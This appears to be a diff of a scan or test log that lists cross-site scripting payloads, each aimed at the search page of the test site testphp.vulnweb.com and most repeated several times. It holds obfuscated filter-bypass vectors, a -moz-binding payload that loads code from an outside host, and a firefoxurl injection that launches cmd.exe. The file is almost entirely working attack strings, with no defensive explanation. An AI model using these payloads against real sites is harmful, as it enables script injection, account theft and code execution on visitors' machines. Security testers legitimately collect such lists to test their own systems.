@@ -1,7 +1,1812 @@
-http://testphp.vulnweb.com//search.php?test=query
+http://testphp.vulnweb.com/search.php?test=query
 searchFor:<script>alert('XSS!')</script>
 
-http://testphp.vulnweb.com//search.php?test=query
+http://testphp.vulnweb.com/search.php?test=query
 searchFor:<script>alert('XSS!')</script>
 
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert('XSS!')</script>
 
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>alert('XSS!')</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:*/a=eval;b=alert;a(b(/e/.source));/*
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:*/a=eval;b=alert;a(b(/e/.source));/*
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:*/a=eval;b=alert;a(b(/e/.source));/*
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:*/a=eval;b=alert;a(b(/e/.source));/*
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:\";alert('XSS');//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:\";alert('XSS');//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:\";alert('XSS');//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:\";alert('XSS');//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<script>alert(0);</script>=&{(alert(1))}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<script>alert(0);</script>=&{(alert(1))}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<script>alert(0);</script>=&{(alert(1))}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:'';!--"<script>alert(0);</script>=&{(alert(1))}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:style=color: expression(alert(0));" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:style=color: expression(alert(0));" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:style=color: expression(alert(0));" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:style=color: expression(alert(0));" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<BR SIZE="&{alert('XSS')}">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<BR SIZE="&{alert('XSS')}">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<BR SIZE="&{alert('XSS')}">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<BR SIZE="&{alert('XSS')}">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:setTimeout// (name// ,0)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:setTimeout// (name// ,0)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:setTimeout// (name// ,0)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:setTimeout// (name// ,0)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert('XSS')</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert('XSS')</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert('XSS')</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert('XSS')</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+
+http://testphp.vulnweb.com/search.php?test=query
